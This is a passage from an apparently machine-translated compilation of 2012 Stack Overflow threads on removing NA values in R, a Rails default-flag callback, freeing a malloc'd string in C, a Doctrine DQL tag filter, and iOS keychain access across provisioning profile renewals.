1.5849, 1.5865, 1.576, 1.5795, 1.5888, 1.5743, 1.5814, 1.5792, 
1.581, 1.5822, 1.5811, 1.582, 1.5745, 1.5872, 1.5557, 1.5533, 
1.5552, 1.5603, 1.5456, 1.5396, 1.5309, 1.5377, 1.5411, 1.5462, 
1.5615, 1.5831, 1.5805, 1.5783, 1.577, 1.5602, 1.5537, 1.5426, 
1.5486, 1.5562, 1.5419, 1.5435, 1.5493, 1.5374, 1.5467, 1.5376, 
1.5528, 1.5508, 1.5449, 1.5488, 1.5443, 1.5551, 1.547, 1.5467, 
1.5461, 1.5515, 1.5573, 1.5519, 1.5426, 1.5444, 1.5411, 1.55, 
1.5466, 1.5421, 1.5423, 1.5201, 1.5036, 1.5003, 1.5009, 1.5016, 
1.4954, 1.497, 1.492, 1.4953, 1.4972, 1.5094, 1.5077, 1.4994, 
1.4945, 1.5146, 1.5235, 1.5172, 1.5097, 1.53, 1.5348, 1.528, 
1.5453, 1.5454, 1.551, 1.548, 1.5539, 1.5594, 1.5536, 1.5537, 
1.5582, 1.5589, 1.5643, 1.5612, 1.5703, 1.5722, 1.5778, 1.5741, 
1.5725, 1.571, 1.5777, 1.5773, 1.5728, 1.5728, 1.5691, 1.5718, 
1.5714, 1.5738, 1.572, 1.5703, 1.5805, 1.5783, 1.5768, 1.5737, 
1.5507, 1.55, 1.5539, 1.559, 1.5535, 1.5575, 1.5539, 1.5341, 
1.5354, 1.5295, 1.5327, 1.5282, 1.532, 1.53, 1.5303, 1.5087, 
1.5095, 1.5127, 1.5183, 1.5147, 1.5119, 1.5099, 1.5148, 1.5228, 
1.52, 1.525, 1.5309, 1.5355, 1.5312, 1.5291, 1.5241, 1.5184, 
1.5137, 1.5084, 1.4914, 1.4887, 1.4729, 1.4796, 1.4679, 1.4727, 
1.4749, 1.458, 1.4644, 1.465, 1.4601, 1.4329, 1.4028, 1.3926, 
1.3855, 1.3904, 1.4145, 1.4053, 1.4136, 1.3926, 1.3882, 1.3865, 
1.3973, 1.4125, 1.4061, 1.4015, 1.4128, 1.4087, 1.3997, 1.3773, 
1.4107, 1.3685, 1.3723, 1.3854, 1.3835, 1.3763, 1.3811, 1.4055, 
1.401, 1.4048, 1.3892, 1.39, 1.3715, 1.3677, 1.3542, 1.3704, 
1.3766, 1.3699, 1.365, 1.3811, 1.3734, 1.3823, 1.3902, 1.3753, 
1.3746, 1.3697, 1.3711, 1.3646, 1.3701, 1.3906, 1.4135, 1.4433, 
1.4466, 1.4414, 1.4368, 1.4597, 1.4404, 1.4482, 1.4362, 1.439, 
1.4043, 1.3829, 1.3886, 1.3899, 1.413, 1.4233, 1.406, 1.4074, 
1.4188, 1.4074, 1.4198, 1.3973, 1.4029, 1.4044, 1.3974, 1.4106, 
1.4007, 1.3991, 1.3924, 1.3921, 1.3845, 1.3877, 1.3942, 1.3846, 
1.3884, 1.3891, 1.3841, 1.3782, 1.3817, 1.3833, 1.3816, 1.3935, 
1.3988, 1.402, 1.4042, 1.3923, 1.391, 1.3963, 1.3883, 1.3887, 
1.3767, 1.3865, 1.3837, 1.393, 1.3849, 1.3863, 1.3792, 1.3807, 
1.3805, 1.3967, 1.3915, 1.3928, 1.4048, 1.4067, 1.4073, 1.423, 
1.4334, 1.4341, 1.4749, 1.4756, 1.4771, 1.4702, 1.4723, 1.4852, 
1.4791, 1.4803, 1.4786, 1.4615, 1.4714, 1.4758, 1.4695, 1.4633, 
1.4647, 1.4631, 1.479, 1.475, 1.481, 1.4717, 1.4714, 1.4908, 
1.4895, 1.4875, 1.4873, 1.4876, 1.4675, 1.44, 1.4175, 1.4278, 
1.4413, 1.4268, 1.4212, 1.423, 1.4299, 1.4393, 1.4363, 1.4301, 
1.427, 1.4119, 1.4176, 1.4249, 1.4223, 1.4291, 1.4195, 1.4168, 
1.4235, 1.4141, 1.3979, 1.3851, 1.387, 1.3936, 1.4017, 1.4006, 
1.4053, 1.4083, 1.4164, 1.4191, 1.4155, 1.4134, 1.4167, 1.4166, 
1.4161, 1.4123, 1.4195, 1.4145, 1.4024, 1.4095, 1.4048, 1.4125, 
1.4079, 1.4085, 1.4136, 1.4165, 1.4358, 1.4338, 1.4368, 1.4453, 
1.4451, 1.4381, 1.4363, 1.4432, 1.4416, 1.448, 1.4442, 1.4485, 
1.4499, 1.4418, 1.4426, 1.4318, 1.4355, 1.4434, 1.4402, 1.4402, 
1.4333, 1.4313, 1.4319, 1.4313, 1.4347, 1.4403, 1.4565, 1.4375, 
1.4403, 1.4432, 1.4383, 1.437, 1.4407, 1.4466, 1.4576, 1.4646, 
1.4696, 1.479, 1.4755, 1.4773, 1.4803, 1.4763, 1.4912, 1.4859, 
1.4899, 1.4879, 1.4933, 1.4872, 1.4693, 1.4718, 1.4773, 1.4762, 
1.4774, 1.4725, 1.4782, 1.4692, 1.4713, 1.4617, 1.443, 1.4533, 
1.4513, 1.4516, 1.4513, 1.4471, 1.4528, 1.4614, 1.4697, 1.4759, 
1.4758, 1.4789, 1.475, 1.4789, 1.4836, 1.4823, 1.4805, 1.4718, 
1.4709, 1.476, 1.4742, 1.4762, 1.4775, 1.4763, 1.4753, 1.4777, 
1.4758, 1.4875, 1.4781, 1.4764, 1.4832, 1.4818, 1.4792, 1.4805, 
1.4826, 1.4778, 1.4918, 1.4997, 1.5013, 1.5037, 1.5104, 1.5096, 
1.5073, 1.5121, 1.5057, 1.5164, 1.518, 1.5219, 1.5295, 1.5288, 
1.5213, 1.5336, 1.5336, 1.5328, 1.5273, 1.5266, 1.5213, 1.5183, 
1.5168, 1.5249, 1.5336, 1.5368, 1.5341, 1.5368, 1.5262, 1.5347, 
1.5415, 1.5387, 1.5405, 1.5414, 1.5414, 1.5483, 1.5453, 1.5323, 
1.5275, 1.5265, 1.5318, 1.5293, 1.5301, 1.5345, 1.536, 1.5363, 
1.5363, 1.5353, 1.5229, 1.5177, 1.5148, 1.5207, 1.5244, 1.5289, 
1.5315, 1.5322, 1.5287, 1.5218, 1.5222, 1.5235, 1.527, 1.5252, 
1.5235, 1.528, 1.5278, 1.5233, 1.5246, 1.5217, 1.5226, 1.5184, 
1.4922, 1.4865, 1.4917, 1.4885, 1.4863, 1.4897, 1.4877, 1.4784, 
1.4809, 1.4808, 1.4774, 1.4728, 1.4736, 1.4779, 1.4813, 1.4843, 
1.4829, 1.4845, 1.4784, 1.4753, 1.4767, 1.4834, 1.4856, 1.4935, 
1.4882, 1.4893, 1.4817, 1.4959, 1.4874, 1.4783, 1.4777, 1.476, 
1.4802, 1.4778, 1.4869, 1.4844, 1.4823, 1.4848, 1.4885, 1.4918, 
1.508, 1.5098, 1.5122, 1.5124, 1.5095, 1.5143, 1.5084, 1.514, 
1.5149, 1.5134, 1.5132, 1.5102, 1.5217, 1.5243, 1.5253, 1.5258, 
1.527, 1.5306, 1.5296, 1.5304, 1.5272, 1.5285, 1.5298, 1.5315, 
1.5293, 1.5405, 1.5375, 1.5437, 1.543, 1.5362, 1.535, 1.5234, 
1.5227, 1.5234, 1.5203, 1.5103, 1.5073, 1.5132, 1.5165, 1.5132, 
1.5168, 1.5164, 1.5078, 1.5059, 1.499, 1.4991, 1.5068, 1.5093, 
1.5083, 1.5017, 1.5028, 1.4977, 1.499, 1.5023, 1.5192, 1.5276, 
1.5261, 1.5316, 1.5371, 1.5424, 1.5665, 1.5627, 1.5547, 1.5404, 
1.5566, 1.5539, 1.5412, 1.5439, 1.5466, 1.5534, 1.5454, 1.5544, 
1.5601, 1.5539, 1.5536, 1.5553, 1.5564, 1.5552, 1.5567, 1.5411, 
1.5418, 1.5575, 1.5649, 1.5628, 1.5714, 1.5757, 1.5841, 1.5895, 
1.594, 1.5895, 1.5925, 1.6113, 1.624, 1.6244, 1.6407, 1.639, 
1.6268, 1.6376, 1.6511, 1.6436, 1.6394, 1.6377, 1.6429, 1.6415, 
1.6484, 1.6501, 1.6722, 1.6565, 1.6721, 1.6832, 1.6871, 1.6862, 
1.6995, 1.6914, 1.694, 1.6896, 1.6831, 1.6697, 1.6758, 1.689, 
1.6897, 1.6882, 1.6934, 1.7094, 1.7113, 1.7185, 1.7189, 1.7032, 
1.7055, 1.7014, 1.7012, 1.6993, 1.6901, 1.6782, 1.6815, 1.6867, 
1.6834, 1.6882, 1.6907, 1.6922, 1.6775, 1.6762, 1.6684, 1.6697, 
1.6703, 1.6683, 1.6758, 1.711, 1.711, 1.7197, 1.7169, 1.7241, 
1.7233, 1.7339, 1.7286, 1.7257, 1.7162, 1.7023, 1.7112, 1.7124, 
1.717, 1.7235, 1.7273, 1.7248, 1.7317, 1.7186, 1.7285, 1.732, 
1.7231, 1.7194, 1.7075, 1.6934, 1.7004, 1.6972, 1.7006, 1.6983, 
1.6941, 1.7072, 1.6949, 1.695, 1.6933, 1.6907, 1.6911, 1.7012, 
1.6968, 1.6967, 1.7056, 1.7262, 1.7261, 1.7294, 1.7289, 1.7289, 
1.7085, 1.7167, 1.7148, 1.724, 1.7378, 1.7295, 1.7338, 1.727, 
1.7247, 1.7321, 1.7224, 1.724, 1.7235, 1.7286, 1.7363, 1.7426, 
1.7401, 1.7511, 1.749, 1.7539, 1.7448, 1.7572, 1.7619, 1.7512, 
1.7696, 1.7909, 1.8003, 1.7974, 1.7922, 1.7907, 1.7964, 1.8127, 
1.8273, 1.8306, 1.8372, 1.8445, 1.8291, 1.8377, 1.8368, 1.8567, 
1.8639, 1.879, 1.8745, 1.8733, 1.8531, 1.8544, 1.8624, 1.8316, 
1.8461, 1.8183, 1.8223, 1.8364, 1.8568, 1.842, 1.8173, 1.8202, 
1.8005, 1.8104, 1.7964, 1.8002, 1.8114, 1.8328, 1.8184, 1.8182, 
1.8068, 1.8103, 1.8111, 1.8015, 1.7915, 1.7699, 1.7632, 1.7681, 
1.7686, 1.7708, 1.7713, 1.793, 1.7954, 1.7717, 1.7678, 1.7647, 
1.7589, 1.7662, 1.7756, 1.7671, 1.7625, 1.7622, 1.7539, 1.754, 
1.739, 1.7499, 1.7506, 1.7564, 1.7511, 1.7443, 1.7687, 1.7714, 
1.7851, 1.7815, 1.7747, 1.7783, 1.7599, 1.7248, 1.7416, 1.7231, 
1.7211, 1.7362, 1.721, 1.7232, 1.7209, 1.7055, 1.7116, 1.7113, 
1.7238, 1.7233, 1.7308, 1.7336, 1.7252, 1.7327, 1.7314, 1.748, 
1.7353, 1.7437, 1.7593, 1.7642, 1.7639, 1.7774, 1.7746, 1.7684, 
1.7704, 1.7828, 1.7884, 1.7946, 1.783, 1.7733, 1.7732, 1.7702, 
1.7846, 1.7718, 1.7725, 1.7688, 1.7804, 1.7733, 1.7724, 1.7724, 
1.7836, 1.7915, 1.7981, 1.8037, 1.8185, 1.8226, 1.8257, 1.8166, 
1.8203, 1.8185, 1.8213, 1.8228, 1.8312, 1.8271, 1.8367, 1.8408, 
1.8273, 1.8025, 1.7805, 1.7891, 1.7891, 1.8054, 1.8233, 1.828, 
1.8223, 1.819, 1.8082, 1.7888, 1.7934, 1.8138, 1.8087, 1.8205, 
1.8097, 1.8243, 1.8186, 1.8248, 1.8196, 1.8243, 1.8218, 1.7988, 
1.8019, 1.8117, 1.8131, 1.8148, 1.8122, 1.8089, 1.8187, 1.829, 
1.8322, 1.827, 1.8312, 1.8366, 1.8278, 1.8167, 1.8208, 1.8138, 
1.826, 1.8273, 1.8343, 1.8282, 1.8295, 1.8266, 1.8233, 1.8279, 
1.8446, 1.8494, 1.8497, 1.849, 1.8473, 1.8427, 1.8388, 1.8244, 
1.8176, 1.8176, 1.823, 1.8037, 1.797, 1.8076, 1.8075, 1.8024, 
1.7904, 1.7917, 1.7987, 1.7953, 1.7896, 1.7951, 1.7938, 1.7945, 
1.7793, 1.7815, 1.7728, 1.7648, 1.7638, 1.7688, 1.7765, 1.7747, 
1.7778, 1.7779, 1.7814, 1.7892, 1.7845, 1.77, 1.7575, 1.7574, 
1.7672, 1.7721, 1.7816, 1.778, 1.7828, 1.7803, 1.7818, 1.7719, 
1.7637, 1.7731, 1.7775, 1.7796, 1.7966, 1.8041, 1.8044, 1.8132, 
1.798, 1.79, 1.7899, 1.7829, 1.7944, 1.8009, 1.8015, 1.7955, 
1.8098, 1.8133, 1.805, 1.8185, 1.8221, 1.8185, 1.808, 1.8122, 
1.8179, 1.8292, 1.8183, 1.8036, 1.7988, 1.803, 1.792, 1.7881, 
1.7785, 1.7876, 1.7907, 1.7926, 1.7788, 1.7824, 1.7754, 1.7736, 
1.7746, 1.7786, 1.7844, 1.7832, 1.7719, 1.7682, 1.7727, 1.7796, 
1.7813, 1.7747, 1.7844, 1.7969, 1.7938, 1.7973, 1.8004, 1.7995, 
1.8023, 1.7964, 1.7993, 1.8076, 1.8076, 1.7764, 1.7635, 1.7493, 
1.7508, 1.7244, 1.7346, 1.725, 1.7291, 1.7242, 1.692, 1.6878, 
1.7031, 1.687, 1.6918, 1.681, 1.6915, 1.6826, 1.6849, 1.6873, 
1.6788, 1.6711, 1.6806, 1.678, 1.6714, 1.6502, 1.6366, 1.6348, 
1.6389, 1.6134, 1.6084, 1.6339, 1.6493, 1.6374, 1.6445, 1.624, 
1.6232, 1.6288, 1.6421, 1.6482, 1.639, 1.6353, 1.6449, 1.6583, 
1.6572, 1.6505, 1.6562, 1.6507, 1.6588, 1.6693, 1.6581, 1.6623, 
1.6875, 1.684, 1.6783, 1.6927, 1.6892, 1.6668, 1.6694, 1.6676, 
1.68, 1.6887, 1.7044, 1.7045, 1.7047, 1.7036, 1.7084, 1.6908, 
1.678, 1.673, 1.6741, 1.6755, 1.6764, 1.671, 1.6679, 1.6595, 
1.6536, 1.6523, 1.6591, 1.6672, 1.6645, 1.6643, 1.6732, 1.6753, 
1.6742, 1.6803, 1.679, 1.6722, 1.672, 1.6656, 1.6576, 1.6598, 
1.6688, 1.6759, 1.693, 1.6957, 1.6945, 1.6712, 1.6716, 1.6875, 
1.6865, 1.6852, 1.6904, 1.6885, 1.6887, 1.6916, 1.6899, 1.7003, 
1.713, 1.7222, 1.7302, 1.7225, 1.7238, 1.7324, 1.7329, 1.7387, 
1.7308, 1.7276, 1.7312, 1.7342, 1.7406, 1.7494, 1.7412, 1.7429, 
1.7627, 1.7729, 1.7812, 1.7856, 1.7698, 1.7817, 1.7889, 1.7899, 
1.7915, 1.8061, 1.8026, 1.7972, 1.7964, 1.7854, 1.8057, 1.7872, 
1.7871, 1.793, 1.7768, 1.7803, 1.7902, 1.7936, 1.7948, 1.7909, 
1.7989, 1.8221, 1.825, 1.8174, 1.8116, 1.809, 1.8131, 1.8242, 
1.8175, 1.8117, 1.8053, 1.8149, 1.8031, 1.8126, 1.8091, 1.8232, 
1.827, 1.8429, 1.8354, 1.8439, 1.8458, 1.8373, 1.8447, 1.8367, 
1.8394, 1.8467, 1.8487, 1.8508, 1.8437, 1.8316, 1.8146, 1.813, 
1.8105, 1.8235, 1.8324, 1.8404, 1.8279, 1.8322, 1.834, 1.8352, 
1.8408, 1.8529, 1.8499, 1.8435, 1.8667, 1.8701, 1.8705, 1.8755, 
1.869, 1.8882, 1.8892, 1.8981, 1.8995, 1.8759, 1.8752, 1.8646, 
1.864, 1.8746, 1.8778, 1.8961, 1.8958, 1.8833, 1.8956, 1.8978, 
1.8969, 1.8905, 1.8688, 1.8856, 1.892, 1.8966, 1.9088, 1.9138, 
1.9118, 1.9082, 1.913, 1.9214, 1.9195, 1.9291, 1.9214, 1.9162, 
1.9089, 1.9141, 1.9224, 1.8788, 1.8626, 1.8642, 1.8686, 1.8353, 
1.8405, 1.8428, 1.8254, 1.8275, 1.8344, 1.8341, 1.8172, 1.8108, 
1.8141, 1.8279, 1.8225, 1.8349, 1.8373, 1.8508, 1.8506, 1.8615, 
1.8561, 1.8405, 1.8369, 1.8487, 1.8586, 1.8707, 1.8758, 1.8708, 
1.8721, 1.8517, 1.8462, 1.8263, 1.8446, 1.849, 1.849, 1.8452, 
1.8517, 1.8678, 1.8828, 1.8752, 1.8815, 1.8804, 1.88, 1.8788, 
1.8671, 1.8622, 1.875, 1.8686, 1.8727, 1.8628, 1.8438, 1.8366, 
1.8282, 1.828, 1.8311, 1.8268, 1.8223, 1.8404, 1.8383, 1.823, 
1.8174, 1.8141, 1.797, 1.803, 1.8116, 1.8149, 1.8095, 1.8293, 
1.8319, 1.8472, 1.8577, 1.8577, 1.8609, 1.8641, 1.8641, 1.8662, 
1.8726, 1.8786, 1.886, 1.8799, 1.8744, 1.8796, 1.8954, 1.8977, 
1.8975, 1.8819, 1.8958, 1.9003, 1.8938, 1.9002, 1.9182, 1.9184, 
1.9333, 1.9433, 1.9424, 1.9406, 1.9491, 1.9532, 1.9126, 1.9124, 
1.9088, 1.9217, 1.9244, 1.9334, 1.945, 1.9489, 1.9212, 1.9375, 
1.9395, 1.9386, 1.9403, 1.9261, 1.9326, 1.9417, 1.9468, 1.9513, 
1.9265, 1.8985, 1.8921, 1.8899, 1.9009, 1.9055, 1.8993, 1.904, 
1.9042, 1.932, 1.9397, 1.9349, 1.9367, 1.9373, 1.9423, 1.9514, 
1.9433, 1.9535, 1.9789, 1.996, 1.9991, 2.0104, 2.0119, 1.9873, 
1.9963, 1.9994, 1.9828, 1.9759, 1.9848, 1.9843, 1.9957, 1.9886, 
1.9883, 1.9836, 1.9854, 1.9815, 1.9422, 1.9485, 1.9636, 1.9983, 
2.0228, 2.0315, 2.0203, 2.0241, 2.0336, 2.0347, 2.0428, 2.0434, 
2.0184, 2.0279, 2.0231, 2.0314, 2.0185, 2.0097, 2.0197, 2.0174, 
2.0137, 2.0342, 2.0156, 2.0131, 2.0152, 2.0223, 2.0517, 2.0467, 
2.044, 2.0451, 2.0488, 2.0254, 2.0394, 2.0403, 2.038, 2.0313, 
2.0419, 2.0469, 2.0456, 2.0482, 2.0605, 2.0795, 2.0818, 2.0818, 
2.0815, 2.109, 2.1178, 2.1455, 2.1464, 2.1531, 2.1543, 2.1936, 
2.1923, 2.1908, 2.1884, 2.1675, 2.1464, 2.1644, 2.1571, 2.1344, 
2.1609, 2.1952, 2.1886, 2.1908, 2.1637, 2.1522, 2.1554, 2.1567, 
2.1124, 2.1083, 2.0975, 2.109, 2.1007, 2.0716, 2.0708, 2.0397, 
2.0435, 2.0514, 2.0568, 2.0505, 2.036, 2.0396, 2.0532, 2.0357, 
2.0368, 2.0472, 2.0672, 2.0819, 2.0886, 2.0873, 2.0734, 2.0677, 
2.0534, 2.0404, 2.0554, 2.0591, 2.0448, 2.0465, 2.0605, 2.053, 
2.0568, 2.0711, 2.0915, 2.0869, 2.0923, 2.098, 2.1162, 2.1157, 
2.0976, 2.0962, 2.078, 2.0758, 2.0825, 2.1097, 2.1108, 2.1132, 
2.1403, 2.1627, 2.1526, 2.1532, 2.1738, 2.1789, 2.152, 2.1616, 
2.1635, 2.1418, 2.1453, 2.1385, 2.1521, 2.1642, 2.1776, 2.188, 
2.1665, 2.1614, 2.1751, 2.182, 2.1892, 2.1999, 2.1733, 2.1739, 
2.2071, 2.2274, 2.2455, 2.2574, 2.2695, 2.2724, 2.2623, 2.2706, 
2.2662, 2.2892, 2.2913, 2.3078, 2.2932, 2.2183, 2.2398, 2.2223, 
2.2194, 2.2152, 2.2164, 2.2184, 2.2318, 2.2409, 2.2495, 2.249, 
2.2507, 2.2528, 2.2381, 2.2678, 2.2757, 2.3048, 2.3014, 2.3075, 
2.3295, 2.3352, 2.3397, 2.3363, 2.3603, 2.3594, 2.3209, 2.3147, 
2.3075, 2.2806, 2.274, 2.2648, 2.2711, 2.2724, 2.2841, 2.2772, 
2.2651, 2.274, 2.2794, 2.2758, 2.2894, 2.2938, 2.304, 2.313, 
2.3194, 2.3226, 2.3289, 2.304, 2.2877, 2.2741, 2.2468, 2.2405, 
2.1992, 2.2101, 2.2111, 2.1982, 2.2024, 2.2279, 2.2298, 2.2339, 
2.204, 2.1793, 2.1835, 2.195, 2.1569, 2.1398, 2.118, 2.1057, 
2.1018, 2.1128, 2.0833) 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-11-09T18:18:30.920

甚至更短：

```
v <- na.omit(v) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-09T18:17:25.697

尝试这个：

```
new.v <- v[ !is.na( v ) ] 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-09T18:18:29.783

对于这种情况，要么`is.na`或`na.omit`足够好

```
x <- c(1,NA,2,NA, 3) # a vector with NA
x[!is.na(x)]  # a vector without NA
[1] 1 2 3

as.numeric(na.omit(x))
[1] 1 2 3 
```

从 Dirk 的回答中可以看出，实际`as.numeric`应用于`na.omit`不是必需的：)

# ruby-on-rails - ActiveRecord：仅对已保存的对象触发操作

> ID：13313709
> 
> 赞同：0
> 
> 时间：2012-11-09T18:16:33.670
> 
> 标签：ruby-on-rails, activerecord

我有`Movie`很多模型`Photo`。`default?`对于给定的电影，只能同时设置一张照片。

我想知道如何在 Rails 上实现它。我添加了以下代码，

```
before_save :check_if_default

def check_if_default
  self.movie.photos.where(default: true).update_all(default: false) if self.default?
end 
```

但是通过查看控制台，它不会将新对象更新为真实状态。当尝试这样做时，它们仍然是错误的。

```
> a.photos.find(600).default = true
> a.photos.find(600).save
=> true 
a.photos.find(600).default
=> false 
```

我想知道这是否可能是因为我正在迭代所有对象，包括当前未保存的当前对象并将其设置为 false？

如果是这种情况，我怎么能只迭代那些已经保存在数据库中的项目？我想`after_save`不建议在这里使用回调，因为我应该确保`default?`在将新照片设置为 true 之前将 other possible 设置为 false。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:23:32.957

您没有持久化您更新的实体。

尝试：

```
b = a.photos.find(600)
b.default = true
b.save 
```

或者

```
a.photos.find(600).update_attributes! {default:true} 
```

或者

# c - 修复内存泄漏

> ID：13313711
> 
> 赞同：1
> 
> 时间：2012-11-09T18:16:50.360
> 
> 标签：c, memory, pointers

我有以下函数在我的代码中被多次调用：

```
char* get_section_name(const char* section, const char* value) {

  char *tmp = (char *)malloc(STR_LEN * sizeof(char));

  if(strlen(section)>0) {

      strcat(tmp, section);

      strcat(tmp,".");

  }

  strcat(tmp, value);    

  return tmp;

} 
```

我在这样的其他函数中调用它：

```
section_name = get_section_name(data->model_name,"params_default"); 
```

释放此内存的最佳方法是什么？完成后我可以打电话`free(section_name)`吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:27:34.397

Yes `free`, however, you could consider a different name that makes it clear it is allocating memory. Also, you could make use of `sprintf` for combining 2 strings and `strdup` for just copying one.

```
char* create_section_name(const char* section, const char* value) { 
  const int sectionLen = strlen(section);   

  if(sectionLen>0) {
      //+1 for the period and +1 for the null
      char *tmp = (char *)malloc((sectionLen + strlen(value) + 2) * sizeof(char));
      //do that often? consider a newString(size) macro. See below
      sprintf(tmp, "%s.%s", section, value);    
      return tmp;
  }
  else {    
    return strdup(value);
  }
} 
```

This assumes you don't need the full `STR_LEN`, it uses just enough in both cases.

`newString` macro I suggested:

```
#define newString(size) (malloc((size) * sizeof(char))) 
```

Or it can even automatically add one for the null:

```
#define newString(size) (malloc(((size)+1) * sizeof(char))) 
```

Then malloc is replaced with this:

```
char *tmp = newString(sectionLen + strlen(value) + 1); //+1 for period 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:21:14.957

首先，您必须确保`tmp`已实际分配（即`malloc`没有失败）：

```
tmp = (char *)malloc(STR_LEN * sizeof(char));
if (tmp == NULL) {
  // quit now !
} 
```

然后，就像你`strcat`一样，你必须确定`tmp`是一个空字符串，即它的第一个字符是 0

```
tmp[0] = '\0'; 
```

然后，是的，您可以按照自己编写的方式释放它。

最后一件事：你必须确定`strlen(section)+strlen(".")+strlen(value) < STR_LEN`，否则你会覆盖你不应该覆盖的内存。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:24:26.513

`free`在这里会很好，但作为替代方案，最好的方法可能是更改签名。如果你让它像

```
void get_section_name(const char* section, const char* value, char * result) 
```

然后你可以传递一个指向分配内存的指针，所以这个函数的用户完全知道他应该如何处理使用后的内存。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-09T18:19:46.520

`malloc()`使用、`calloc()`或创建内存时始终执行错误检查`realloc()`

是的，你可以`free`在这里使用

`free(section_name)`, 因为`tmp`返回的存储`section_name`现在指向 malloced 的内存。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-09T18:23:18.483

我将做出`STR_LEN`足够大的信仰飞跃。如果是这样`free(section_name);`就足够了。Bur 使用`strcpy`代替`strcat`或初始化一个空字符串。

# doctrine - 在 Doctrine2 中使用 DQL，如何仅为具有特定标签的产品选择产品及其标签？

> ID：13313713
> 
> 赞同：0
> 
> 时间：2012-11-09T18:16:59.597
> 
> 标签：doctrine, doctrine-orm, dql

我有一个简单的数据模型：一个`Product`可以有很多`Tag`对象。

Tag 模型有一个`tag`字段和一个`value`字段，都是字符串（值在这里并不重要）。

以下 DQL 查询为我提供了所有产品及其标签：

```
SELECT p, t FROM Product p LEFT JOIN p.tags t 
```

但是，我如何只选择具有特定标签（例如“蓝色”）的产品？获取退回产品的所有标签很重要，所以我不能简单地做一个`WHERE t.tag = 'blue'`.

作为一个附带问题；您是否有任何想法是否最好使用单独的 Tag 表来实现这一点，然后让 ProductTag 表将它们编织在一起（正确的多对多关系）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T22:50:35.523

您可以像这样使用 DQL 查询：

```
"SELECT p, t FROM Product p LEFT JOIN p.tags t WHERE p.id IN (
    SELECT sp.id FROM Product sp INNER JOIN sp.tags st WHERE st.tag = 'blue'
)" 
```

这将返回在其标签集合中找到 a 的所有产品对象`Tag.tag = 'blue'`，但也会加入其他标签。

[我在Symfony2](http://symfony.com/)项目中尝试过这个，它就像这样工作。[因为我从Doctrine 文档](http://docs.doctrine-project.org/en/2.1/reference/dql-doctrine-query-language.html)中获得了用于此的所有信息，所以我认为它在独立版本中也可以使用。

如果它不起作用，请告诉我错误，我会仔细研究这个问题。

# iphone - 当我向 AppStore 提交应用更新时，更新配置文件会影响钥匙串访问吗？

> ID：13313715
> 
> 赞同：16
> 
> 时间：2012-11-09T18:17:05.757
> 
> 标签：iphone, ios, xcode, provisioning-profile, ios-provisioning

[我有一个使用钥匙串](http://developer.apple.com/library/ios/#documentation/Security/Conceptual/keychainServConcepts/iPhoneTasks/iPhoneTasks.html)进行身份验证相关存储的 iPhone 应用程序。

我还有一个即将到期的配置文件。

在[钥匙串访问的文档中，](https://developer.apple.com/library/mac/#documentation/security/conceptual/keychainServConcepts/02concepts/concepts.html)它指出：

> 在 iPhone 上，钥匙串权限取决于用于签署应用程序的配置文件。确保在应用程序的不同版本中始终使用相同的配置文件。

因为我的供应配置文件即将到期，所以我更新了它（在供应门户中），下载它，然后双击它，将它“安装”到 XCode 的管理器中。

在向应用商店提交应用更新后，我基本上看到一个空的钥匙串（用户被要求再次登录）。

我的问题是：当更新的配置文件用于提交应用程序更新时，更新用于签署应用程序的配置文件会影响钥匙串访问吗？文档只是说使用“相同的配置文件”，但不清楚更新的配置文件是否算作*不同*的配置文件（正如我上面描述的经验所暗示的那样）。

是什么赋予了？

**更新**

在 tc 的回答的帮助下解决了。查看`embedded.mobileprovision`提交给苹果的每个 .ipas 中的文件显示，过期证书和配置文件用于签署应用程序的版本 x，而不同的证书和配置文件用于签署应用程序的版本 x+1（罪魁祸首：用于代码签名身份的 XCode 的“自动配置文件选择器”功能）。

第一个证书和配置文件是开发人员使用不同的 iOS 开发人员计划帐户开发不相关的应用程序（在同一台机器上，使用相同的 OSX 用户）时遗留下来的。跨多个 iOS 开发者程序帐户的配置文件显然都存储在 中`~/Library/MobileDevice/Provisioning Profiles`，因此它们都是 XCode 的自动配置文件选择功能的候选者。

*我通过选择一个完全不同*的分发配置文件更改了代码签名身份，我误认为该分发配置文件是过期分发配置文件的更新/有效版本，并提交了更新。相同的应用程序，不同的证书，不同的配置文件 == 空钥匙串。哦。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-09T20:24:39.597

您被允许使用的钥匙串由`keychain-access-groups`权利确定，权利限制为`keychain-access-groups`配置文件中的子集，由“捆绑种子”/“前缀”/（`ApplicationIdentifierPrefix`在配置文件中）确定，设置在“应用程序 ID”中。

假设您保留了旧提交的应用程序（或`.ipa`从 iTunes 获得，这只是一个 zip），请查看`embedded.mobileprovision`旧应用程序和新应用程序（`less Foo.app/embedded.mobileprovision`在终端中应该可以解决问题，或者您可以在文本编辑器中打开它虽然有时他们会选择错误的行尾）。您正在寻找这样的东西（您可能会看到用于推送/iCloud 的额外密钥）：

```
 <key>Entitlements</key>
    <dict>
            <key>application-identifier</key>
            <string>A1B2C3D4E5.com.example.MyApp</string>
            <key>get-task-allow</key>
            <false/>
            <key>keychain-access-groups</key>
            <array>
                    <string>A1B2C3D4E5.*</string>
            </array>
    </dict> 
```

您还可以查看您的应用签署的实际权利：

```
codesign -d --entitlements - Foo.app/Foo | vis 
```

IIRC 钥匙串访问组默认为 eg `A1B2C3D4E5.com.example.MyApp`，但您可以将其设置为您想要的任何内容，只要它匹配`A1B2C3D4E5.*`（Xcode 4 甚至有一个不错的 GUI 权利编辑器）。如果捆绑前缀不同，则会导致您看到的问题。如果你没有启用推送/游戏中心/等，我*认为你可以把它改回来。*

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-09T18:38:56.387

只要您的应用程序的捆绑包 id 没有改变，钥匙串就不会有任何问题。

考虑到我们每年都必须更新我们的证书和分发配置文件，如果这样做会破坏我们应用程序的钥匙串访问权限，那将是一片混乱。

我有一款应用在 App Store 中已经存在 4 年多了。它使用钥匙串。多年来，它已多次更新，其中多次使用更新的配置文件。没有钥匙串问题。

